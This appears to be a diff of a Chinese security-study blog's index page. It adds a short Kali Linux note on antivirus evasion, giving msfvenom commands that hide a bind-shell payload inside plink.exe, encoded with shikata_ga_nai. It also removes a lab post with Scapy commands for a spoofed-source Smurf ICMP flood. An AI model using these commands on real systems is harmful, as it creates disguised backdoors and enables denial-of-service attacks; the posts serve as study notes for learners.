@@ -240,6 +240,198 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/13/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B9%9D%E5%8D%81)%EF%BC%9A%E5%85%8D%E6%9D%80%E6%8A%80%E6%9C%AF--%E6%A8%A1%E6%9D%BF%E7%A8%8B%E5%BA%8F%E9%99%84%E7%9D%80/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Tomas">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/photo.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Tomas'Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2020/02/13/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B9%9D%E5%8D%81)%EF%BC%9A%E5%85%8D%E6%9D%80%E6%8A%80%E6%9C%AF--%E6%A8%A1%E6%9D%BF%E7%A8%8B%E5%BA%8F%E9%99%84%E7%9D%80/" itemprop="url">Kali Linux笔记(九十)：免杀技术--模板程序附着</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-13T20:10:01+08:00">
+                2020-02-13
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Kali/" itemprop="url" rel="index">
+                    <span itemprop="name">Kali</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  123 字
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  1 分钟
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <hr>
+<h4 id="1-msfvenom–隐藏shell"><a href="#1-msfvenom–隐藏shell" class="headerlink" title="1. msfvenom–隐藏shell"></a>1. msfvenom–隐藏shell</h4><ul>
+<li>▲ 附着在正常的程序模板上</li>
+<li>msfvenom参数<ul>
+<li>-x（指定模板）</li>
+</ul>
+</li>
+<li>生成隐藏shell<ul>
+<li><strong><code>🔺命令：msfvenom -p windows/shell/bind_tcp -x /usr/share/windows-binaries/plink.exe lhost=1.1.1.1 lport=4444 -a x86 --platform win -f exe -o msfvenom_plink_a.exe</code></strong></li>
+</ul>
+</li>
+<li>编码隐藏shell<ul>
+<li><strong><code>🔺命令：msfvenom -p windows/shell/bind_tcp -x /usr/share/windows-binaries/plink.exe lhost=1.1.1.1 lport=4444 -e x86/shikata_ga_nai -i 5 -a x86 --platform win -f exe &gt; msfvenom_plink_b.exe</code></strong></li>
+</ul>
+</li>
+<li>比较编码前后的检测率</li>
+<li>查看两个shell的免杀效果（查杀网站）</li>
+</ul>
+<p><img src="http://aliyun.tomassky.top:8088/kodex/index.php?user/publicLink&fid=913dDsqoWqfgmCFaxKULa3Rs26q5N6faEj-afSVWXxmPFEyWfi0FyK0A_thO4SqsOfvw87Ge1Hny12CKH58veLiiG6xtX0el8dfZAsbAjsjpkjqvWWXxKG2Wz_sb64nD_Q&file_name=/msfvenom_plink_a.PNG" alt="msfvenom_plink_a.exe"></p>
+<p><img src="http://aliyun.tomassky.top:8088/kodex/index.php?user/publicLink&fid=7f190bA3M9ax_a8Q1iqGnAIpJSaoB7yLOES6ROWFjeyme_9ZqSszd37r_FPxawbOPK__maiCzUOBaOmPv2WB6NsnUWrDxn8z1nMSpSNY2mSMDrD8Xx3tAlUQRVTdu3pBbQ&file_name=/msfvenom_plink_b.PNG" alt="msfvenom_plink_b.exe"></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/13/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AB%E5%8D%81%E4%B9%9D)%EF%BC%9A%E5%85%8D%E6%9D%80%E6%8A%80%E6%9C%AF--crypter%E5%8A%A0%E5%AF%86/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -2744,221 +2936,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/09/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AB%E5%8D%81)%EF%BC%9ASmurf/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Tomas">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/photo.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Tomas'Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2020/02/09/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AB%E5%8D%81)%EF%BC%9ASmurf/" itemprop="url">Kali Linux笔记(八十)：Smurf</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-09T21:27:53+08:00">
-                2020-02-09
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Kali/" itemprop="url" rel="index">
-                    <span itemprop="name">Kali</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-                
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-file-word-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">字数统计&#58;</span>
-                
-                <span title="字数统计">
-                  219 字
-                </span>
-              
-
-              
-                <span class="post-meta-divider">|</span>
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
-                
-                <span title="阅读时长">
-                  1 分钟
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <hr>
-<h4 id="1-Smurf"><a href="#1-Smurf" class="headerlink" title="1. Smurf"></a>1. Smurf</h4><ul>
-<li>世界上最古老的DDoS攻击<ul>
-<li>向广播地址发送伪造源地址的ICMP echo Requset（ping）包</li>
-<li>LAN所有计算机向伪造源地址返回响应包</li>
-<li>对现代操作系统几乎失效（不响应目标为广播的ping）</li>
-</ul>
-</li>
-</ul>
-<h4 id="2-实验准备"><a href="#2-实验准备" class="headerlink" title="2. 实验准备"></a>2. 实验准备</h4><ul>
-<li>Kali（攻击者）<ul>
-<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
-</ul>
-</li>
-<li>Metasploit（被攻击者）<ul>
-<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
-</ul>
-</li>
-</ul>
-<h4 id="3-实验"><a href="#3-实验" class="headerlink" title="3. 实验"></a>3. 实验</h4><ul>
-<li>Metasploit（被攻击者）<ul>
-<li>ifconfig查看IP地址</li>
-</ul>
-</li>
-<li>Kali（攻击者）<ul>
-<li>Scapy<ul>
-<li>i=IP() </li>
-<li>i.src=”Metasploit的IP地址”</li>
-<li>i.dst=”网关的IP地址” </li>
-<li>p=ICMP() </li>
-<li>p.display() </li>
-<li>send(i/p)</li>
-</ul>
-</li>
-<li>▲ send(IP(dst=”网关IP地址”,src=”Metasploit的IP地址”)/ICMP(),count=100,verbose=1)</li>
-</ul>
-</li>
-<li>Metasploit（被攻击者）<ul>
-<li><strong><code>🔺命令：sudo tcpdump -i eth0</code></strong>（进行数据包抓取）</li>
-<li>查看局域网内是否有机器对伪造的源地址进行回应</li>
-</ul>
-</li>
-</ul>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -3013,7 +2990,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">166</span>
+                  <span class="site-state-item-count">167</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -3120,7 +3097,7 @@
     
       <span class="post-meta-item-text">Site words total count&#58;</span>
     
-    <span title="Site words total count">150.5k</span>
+    <span title="Site words total count">150.6k</span>
   
 </div>
 
